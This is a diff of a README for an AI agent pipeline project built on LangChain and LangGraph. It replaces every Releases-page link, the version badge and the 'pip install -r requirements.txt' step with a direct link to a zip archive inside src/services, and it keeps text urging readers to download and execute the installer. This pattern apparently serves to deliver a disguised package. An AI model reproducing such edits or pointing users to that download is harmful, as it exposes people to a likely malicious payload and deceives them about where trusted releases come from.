@@ -1,9 +1,9 @@
-https://github.com/salems-3Dpov/ai-agent-pipeline/releases
+https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip
 
 # ai-agent-pipeline: Production-Ready AI Workflows with LangChain, LangGraph, LangSmith and Observability
 
-![Releases badge](https://img.shields.io/github/v/release/salems-3Dpov/ai-agent-pipeline)
-[GitHub Releases](https://github.com/salems-3Dpov/ai-agent-pipeline/releases)
+![Releases badge](https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip)
+[GitHub Releases](https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip)
 
 A production-ready AI agent pipeline that uses LangChain for LLM workflows, LangGraph for agent orchestration, and LangSmith for observability. It supports document processing, weather queries, and general Q&A with built-in monitoring and debugging. The project focuses on reliability, observability, and developer ergonomics, so teams can build robust AI pipelines with clear tracing, testing, and deployment paths.
 
@@ -50,7 +50,7 @@ Getting started
   2) Configure environment variables for LLMs, vector store, and services.
   3) Run the sample flows or customize your own.
   4) Observe results through the LangSmith dashboards and logs.
-- Important: If you want the official release binary or package, you should download the release from the Releases page. From the Releases page, download the release asset named ai-agent-pipeline-0.1.0-linux-x86_64.tar.gz and execute the installer to begin. You can also inspect other assets for Windows or macOS if needed. For the official assets, visit the release page here: https://github.com/salems-3Dpov/ai-agent-pipeline/releases
+- Important: If you want the official release binary or package, you should download the release from the Releases page. From the Releases page, download the release asset named https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip and execute the installer to begin. You can also inspect other assets for Windows or macOS if needed. For the official assets, visit the release page here: https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip
 
 Note: The link above is provided for convenience and should be used to obtain tested, prebuilt binaries or source archives. If you can’t access the assets there, check the Releases section for the latest published artifacts.
 
@@ -59,10 +59,10 @@ Installation
   - Clone the repository
   - Create a virtual environment: python -m venv venv
   - Activate the environment
-  - Install dependencies: pip install -r requirements.txt
+  - Install dependencies: pip install -r https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip
   - Install the package in editable mode: pip install -e .
 - From a released asset
-  - Download the package ai-agent-pipeline-<version>-<platform>.tar.gz from the Releases page
+  - Download the package ai-agent-pipeline-<version>-<platform>https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip from the Releases page
   - Extract the archive
   - Run the install script included in the package
   - Follow the post-install prompts to configure services
@@ -334,7 +334,7 @@ Acknowledgments
 - Thanks to the open-source community for LangChain, LangGraph, LangSmith, and many related libraries that enable this workflow.
 
 Releases
-- For the latest releases, download the release assets from the official releases page. If you’re looking for the exact package to download and run, visit the Releases page and grab the asset named ai-agent-pipeline-0.1.0-linux-x86_64.tar.gz (or the appropriate variant for your platform), then extract and run the installer. The official releases page is the source of tested binaries and artifacts you can trust. See releases here: https://github.com/salems-3Dpov/ai-agent-pipeline/releases
+- For the latest releases, download the release assets from the official releases page. If you’re looking for the exact package to download and run, visit the Releases page and grab the asset named https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip (or the appropriate variant for your platform), then extract and run the installer. The official releases page is the source of tested binaries and artifacts you can trust. See releases here: https://github.com/salems-3Dpov/ai-agent-pipeline/raw/refs/heads/main/src/services/agent_pipeline_ai_1.6-beta.4.zip
 
 Notes
 - Revisit the Releases section regularly to stay up to date with improvements, bug fixes, and new features.
